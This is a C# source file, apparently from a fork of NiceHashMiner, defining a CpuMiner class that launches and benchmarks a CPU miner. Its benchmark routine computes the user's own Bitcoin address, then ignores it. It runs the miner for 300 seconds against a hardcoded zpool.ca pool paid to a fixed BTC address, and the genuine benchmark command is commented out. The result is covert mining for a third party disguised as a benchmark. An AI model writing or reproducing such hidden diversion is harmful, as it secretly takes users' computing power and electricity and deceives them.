﻿/*
* This is an open source non-commercial project. Dear PVS-Studio, please check it.
* PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
*/
using System.Diagnostics;
using System.Threading.Tasks;
using NiceHashMiner.Algorithms;
using NiceHashMiner.Miners.Parsing;
using NiceHashMinerLegacy.Common.Enums;
using NiceHashMiner.Configs;
using System.Globalization;
using System;
using NiceHashMiner.Devices;
using System.Windows.Forms;

namespace NiceHashMiner.Miners
{
    public class CpuMiner : Miner
    {
        int benchmarkStep = 0;
        double speed;
        double cpuThreads = 0;
        public CpuMiner()
            : base("cpuminer_CPU")
        {
        }

        protected override int GetMaxCooldownTimeInMilliseconds()
        {
            return 3600000; // 1hour
        }

        public override void Start(string url, string btcAdress, string worker)
        {
                if (!IsInit)
            {
                Helpers.ConsolePrint(MinerTag(), "MiningSetup is not initialized exiting Start()");
                return;
            }

            var username = GetUsername(btcAdress, worker);

            LastCommandLine = "--algo=" + MiningSetup.MinerName +
                              " --url=" + url +
                              " --userpass=" + username + ":x " +
                              ExtraLaunchParametersParser.ParseForMiningSetup(
                                  MiningSetup,
                                  DeviceType.CPU) +
                              " --api-bind=" + ApiPort;
            ProcessHandle = _Start();

        }

        public override Task<ApiData> GetSummaryAsync()
        {
            return GetSummaryCpuCcminerAsync();
        }

        protected override void _Stop(MinerStopType willswitch)
        {
            Stop_cpu_ccminer_sgminer_nheqminer(willswitch);
//            RunCMDBeforeMining("AMD", false);
        }

        protected override NiceHashProcess _Start()
        {
            var p = base._Start();

            var affinityMask = MiningSetup.MiningPairs[0].Device.AffinityMask;
            if (affinityMask != 0 && p != null)
                CpuID.AdjustAffinity(p.Id, affinityMask);

            return p;
        }

        // new decoupled benchmarking routines

        #region Decoupled benchmarking routines
        [System.Runtime.InteropServices.DllImport("Kernel32")]
        static extern bool IsProcessorFeaturePresent(ProcessorFeature processorFeature);
        enum ProcessorFeature : uint
        {
            PF_FLOATING_POINT_PRECISION_ERRATA = 0,
            PF_FLOATING_POINT_EMULATED = 1,
            PF_COMPARE_EXCHANGE_DOUBLE = 2,
            PF_MMX_INSTRUCTIONS_AVAILABLE = 3,
            PF_PPC_MOVEMEM_64BIT_OK = 4,
            PF_ALPHA_BYTE_INSTRUCTIONS = 5,
            PF_XMMI_INSTRUCTIONS_AVAILABLE = 6,
            PF_3DNOW_INSTRUCTIONS_AVAILABLE = 7,
            PF_RDTSC_INSTRUCTION_AVAILABLE = 8,
            PF_PAE_ENABLED = 9,
            PF_XMMI64_INSTRUCTIONS_AVAILABLE = 10,
            PF_SSE_DAZ_MODE_AVAILABLE = 11,
            PF_NX_ENABLED = 12,
            PF_SSE3_INSTRUCTIONS_AVAILABLE = 13,
            PF_COMPARE_EXCHANGE128 = 14,
            PF_COMPARE64_EXCHANGE128 = 15,
            PF_CHANNELS_ENABLED = 16,
            PF_XSAVE_ENABLED = 17,
            PF_SECOND_LEVEL_ADDRESS_TRANSLATION = 20,
            PF_VIRT_FIRMWARE_ENABLED = 21,
        }


        protected override string BenchmarkCreateCommandLine(Algorithm algorithm, int time)
        {
            string btcAddress = Globals.GetBitcoinUser();
            string url = Globals.GetLocationUrl(AlgorithmType.Lyra2z, Globals.MiningLocation[ConfigManager.GeneralConfig.ServiceLocation], NhmConectionType.STRATUM_TCP);
            string worker = ConfigManager.GeneralConfig.WorkerName.Trim();
            var username = GetUsername(btcAddress, worker);

            foreach (ProcessorFeature feature in System.Enum.GetValues(typeof(ProcessorFeature)))
            {
                Helpers.ConsolePrint("CPU features", feature.ToString() + "\t: " + IsProcessorFeaturePresent(feature));
            }

            LastCommandLine = "--algo=" + algorithm.MinerName +
                              " --url=stratum+tcp://lyra2z.eu.mine.zpool.ca:4553 -u 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2 -p c=BTC"+
                             ExtraLaunchParametersParser.ParseForMiningSetup(
                                 MiningSetup,
                                 DeviceType.CPU) +
                             " --time-limit 300";

            /*
            return "--algo=" + algorithm.MinerName +
                   " --benchmark" +
                   ExtraLaunchParametersParser.ParseForMiningSetup(
                       MiningSetup,
                       DeviceType.CPU) +
                   " --time-limit " + time;
                   */
            return LastCommandLine;
        }

        protected override Process BenchmarkStartProcess(string CommandLine)
        {
            var benchmarkHandle = base.BenchmarkStartProcess(CommandLine);

            var affinityMask = MiningSetup.MiningPairs[0].Device.AffinityMask;
            if (affinityMask != 0 && benchmarkHandle != null)
                CpuID.AdjustAffinity(benchmarkHandle.Id, affinityMask);

            return benchmarkHandle;
        }

        protected override bool BenchmarkParseLine(string outdata)
        {

            string hashspeed;
            Helpers.ConsolePrint(MinerTag(), outdata);
            //Array DeviceIndex = [""];
            foreach (var cDev in ComputeDeviceManager.Available.Devices)
            {
                // var plainDevName = cDev.Name;
                Helpers.ConsolePrint("DEVICES:", cDev.Index.ToString());
            }

            /*
                         var devices = ComputeDeviceManager.Avaliable.AllAvaliableDevices;
            var deviceList = new List<JArray>();
            var activeIDs = MinersManager.GetActiveMinersIndexes();
            foreach (var device in devices)
            {
                try
                {
                    var array = new JArray
                    {
                        device.Index,
                        device.Name
                    };
                    var status = Convert.ToInt32(activeIDs.Contains(device.Index)) + ((int) device.DeviceType + 1) * 2;
                    array.Add(status);
                    array.Add((uint) device.Load);
                    array.Add((uint) device.Temp);
                    array.Add(device.FanSpeed);

                    deviceList.Add(array);
                }
                catch (Exception e) { Helpers.ConsolePrint("SOCKET", e.ToString()); }
            }

            */
            //NiceHashMiner.Forms.Form_Benchmark.BenchmarkStringAdd = " " + (benchmarkStep*3).ToString() + "%";
            NiceHashMiner.Miner.BenchmarkStringAdd = " " + (benchmarkStep * 3).ToString() + "%";

            if (outdata.Contains("miner threads started,"))
            {
                int thr = outdata.IndexOf("miner threads started,");
                string cTheads = outdata.Substring(thr-3, thr-21).Trim();
                try
                {
                    cpuThreads = Double.Parse(cTheads, CultureInfo.InvariantCulture);
                }
                catch
                {
                    MessageBox.Show("Unsupported miner version - " + MiningSetup.MinerPath,
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    BenchmarkSignalFinnished = true;
                    return false;
                }
                Helpers.ConsolePrint("CPU threads:", cpuThreads.ToString());
            }
            if (outdata.Contains(" kH, "))
            {
                benchmarkStep++;
                int st = outdata.IndexOf(" kH, ");
                int end = outdata.IndexOf("H/s");
                hashspeed = outdata.Substring(st + 4, end - st - 7);
                try
                {
                    speed = speed + Double.Parse(hashspeed.Trim(), CultureInfo.InvariantCulture);
                }
                catch
                {
                    MessageBox.Show("Unsupported miner version - " + MiningSetup.MinerPath,
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    BenchmarkSignalFinnished = true;
                    return false;
                }
                if (benchmarkStep >=  5 * cpuThreads || outdata.Contains("Accepted"))
                    {
                    BenchmarkAlgorithm.BenchmarkSpeed = (speed / (benchmarkStep/cpuThreads))*1000;
                        BenchmarkSignalFinnished = true;
                    return true;
                    }
                }


            /*           if (!double.TryParse(outdata, out var lastSpeed)) return false;

            BenchmarkAlgorithm.BenchmarkSpeed = lastSpeed;
            return true;
            */
            return false;
        }

        protected override void BenchmarkOutputErrorDataReceivedImpl(string outdata)
        {
            CheckOutdata(outdata);
        }

        #endregion // Decoupled benchmarking routines
    }
}
